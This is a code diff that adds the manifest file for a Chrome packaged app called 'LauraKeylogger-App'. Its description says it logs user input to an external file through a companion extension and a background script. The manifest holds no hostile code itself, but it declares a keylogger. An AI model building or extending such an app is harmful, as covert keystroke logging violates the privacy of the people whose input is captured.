@@ -1,0 +1,14 @@
+{
+  "name": "LauraKeylogger-App",
+  "description": "This application connects to the extension and log data to an external file the user input.",
+  "version": "0.3",
+  "minimum_chrome_version": "31",
+  "manifest_version": 2,
+  "app": {
+    "background": {
+      "scripts": ["main.js"]
+    }
+  },
+  "permissions": [ "storage" ],
+  "icons": { "16": "icon-16.png", "128": "icon-128.png" }
+}
